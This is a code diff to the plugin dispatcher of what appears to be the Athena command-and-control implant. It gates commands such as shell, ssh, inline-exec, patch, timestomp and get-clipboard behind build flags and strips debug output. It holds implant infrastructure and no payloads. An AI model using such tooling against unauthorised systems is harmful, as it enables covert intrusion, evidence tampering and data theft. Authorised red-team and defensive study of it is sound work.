@@ -1,30 +1,23 @@
-using Athena.Commands.Model;
 using Athena.Models.Mythic.Tasks;
 using System.Collections.Concurrent;
-using System.Runtime.Loader;
 using Athena.Plugins;
 using System.Text.Json;
 using Plugins;
-using System.Data.Common;
-using System.Runtime.CompilerServices;
 using Plugin.Plugins;
+using Athena.Utilities;
 using System.Text.Json.Serialization;
-using System.ComponentModel;
-using System.Collections.Specialized;
-using System.Text.Json.Nodes;
-using System.Linq;
 
 namespace Athena.Commands
 {
-    internal class PluginParams
-    {
-        public Dictionary<string, string> parameters { get; set; } = new();
-    }
-    [JsonSerializable(typeof(PluginParams))]
-    [JsonSerializable(typeof(string))]
-    internal partial class PluginParamsJsonContext : JsonSerializerContext
-    {
-    }
+    //internal class PluginParams
+    //{
+    //    public Dictionary<string, string> parameters { get; set; } = new();
+    //}
+    //[JsonSerializable(typeof(PluginParams))]
+    //[JsonSerializable(typeof)]
+    //internal partial class PluginParamsJsonContext : JsonSerializerContext
+    //{
+    //}
 
 
     public class AssemblyHandler
@@ -116,8 +109,9 @@ namespace Athena.Commands
             {
                 //Workaround due to https://stackoverflow.com/questions/59198417/deserialization-of-reference-types-without-parameterless-constructor-is-not-supp
                 //job.task.parameters = job.task.parameters.Replace("null", "\"\"");
-                Dictionary<string, string> parameters = new();
-                
+                Dictionary<string, string> parameters = Misc.ConvertJsonStringToDict(job.task.parameters);
+
+
                 if (String.IsNullOrEmpty(job.task.parameters))
                 {
                     parameters = new Dictionary<string,string>();
@@ -133,12 +127,10 @@ namespace Athena.Commands
                 }
                 parameters.Add("task-id", job.task.id);
                 this.loadedPlugins[job.task.command].Execute(parameters);
-                Console.WriteLine("Done.");
                 return null;
             }
             catch (Exception e)
             {
-                Console.WriteLine(e);
                 return new ResponseResult()
                 {
                     user_output = e.ToString() + Environment.NewLine + e.InnerException + Environment.NewLine + e.StackTrace,
@@ -154,117 +146,186 @@ namespace Athena.Commands
         /// <param name="command">Event Sender</param>
         public async Task<bool> IsCommandLoaded(string command)
         {
+            if (this.loadedPlugins.ContainsKey(command))
+            {
+                return true;
+            }
+
             IPlugin plugin;
             switch (command)
             {
+#if ARP
                 case "arp":
                     plugin = new Arp();
                     break;
+#endif
+#if CAT
                 case "cat":
                     plugin = new Cat();
                     break;
+#endif
+#if CD
                 case "cd":
                     plugin = new Cd();
                     break;
+#endif
+#if CP
                 case "cp":
                     plugin = new Cp();
                     break;
+#endif
+#if CROP
                 case "crop":
                     plugin = new CropPlugin();
                     break;
+#endif
+#if DRIVES
                 case "drives":
                     plugin = new Drives();
                     break;
-                //case "ds":
-                //    plugin = new Ds();
-                //    break;
+#endif
+//case "ds":
+//    plugin = new Ds();
+//    break;
+#if ENV
                 case "env":
                     plugin = new Env();
                     break;
+#endif
+#if FARMER
                 case "farmer":
                     plugin = new Farmer();
                     break;
+#endif
+#if GETCLIPBOARD
                 case "get-clipboard":
                     plugin = new GetClipboard();
                     break;
+#endif
+#if GETSESSIONS
                 case "get-sessions":
                     plugin = new GetSessions();
                     break;
+#endif
+#if GETSHARES
                 case "get-shares":
                     plugin = new GetShares();
                     break;
+#endif
+#if HOSTNAME
                 case "hostname":
                     plugin = new HostName();
                     break;
+#endif
+#if IFCONFIG
                 case "ifconfig":
                     plugin = new IfConfig();
                     break;
+#endif
+#if INLINEEXEC
                 case "inline-exec":
                     plugin = new InlineExec();
                     break;
+#endif
+#if KILL
                 case "kill":
                     plugin = new Kill();
                     break;
+#endif
+#if LS
                 case "ls":
                     plugin = new Ls();
                     break;
+#endif
+#if MKDIR
                 case "mkdir":
                     plugin = new Mkdir();
                     break;
+#endif
+#if MV
                 case "mv":
                     plugin = new Mv();
                     break;
+#endif
+#if NSLOOKUP
                 case "nslookup":
                     plugin = new Nslookup();
                     break;
+#endif
+#if PATCH
                 case "patch":
                     plugin = new Patch();
                     break;
+#endif
+#if PS
                 case "ps":
                     plugin = new Ps();
                     break;
+#endif
+#if PWD
                 case "pwd":
                     plugin = new Pwd();
                     break;
+#endif
+#if REG
                 case "reg":
                     plugin = new Reg();
                     break;
+#endif
+#if RM
                 case "rm":
                     plugin = new Rm();
                     break;
+#endif
+#if SFTP
                 case "sftp":
                     plugin = new Sftp();
                     break;
+#endif
+#if SHELL
                 case "shell":
                     plugin = new Shell();
                     break;
+#endif
+#if SSH
                 case "ssh":
                     plugin = new Ssh();
                     break;
+#endif
+#if TAIL
                 case "tail":
                     plugin = new Tail();
                     break;
+#endif
+#if TESTPORT
                 case "test-port":
                     plugin = new TestPort();
                     break;
+#endif
+#if TIMESTOMP
                 case "timestomp":
                     plugin = new TimeStomp();
                     break;
+#endif
+#if UPTIME
                 case "uptime":
                     plugin = new Uptime();
                     break;
+#endif
+#if WHOAMI
                 case "whoami":
                     plugin = new WhoAmI();
                     break;
+#endif
+#if WINENUMRESOURCES
                 case "win-enum-resources":
                     plugin = new WinEnumResources();
                     break;
+#endif
                 default:
-                    Console.WriteLine("Command is not loaded.");
                     return false;
             }
-            Console.WriteLine("Command is loaded.");
-            return loadedPlugins.TryAdd(command, plugin);
+            return loadedPlugins.TryAdd(command, plugin); //Don't listen to the debuggers lies, this code is reachable
         }
     }
 }
